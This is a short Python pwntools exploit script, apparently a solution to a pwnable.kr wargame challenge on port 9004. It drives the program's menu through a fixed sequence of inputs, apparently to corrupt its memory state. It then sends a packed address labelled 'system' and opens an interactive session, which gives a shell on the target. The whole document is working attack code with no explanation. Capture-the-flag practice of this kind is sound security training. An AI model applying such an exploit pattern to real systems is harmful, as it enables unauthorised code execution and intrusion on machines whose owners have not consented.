from pwn import *

system = 0x8048dbf
fd = remote("pwnable.kr", 9004)
fd.recv()

for i in range(4):
	fd.sendline("1")
	fd.recv()

for i in range(4):
	fd.sendline("3")
	fd.recv()
	fd.sendline("3")
	fd.recv()
	fd.sendline("2")
	fd.recv()

fd.recv()
fd.sendline(p32(system))

fd.interactive()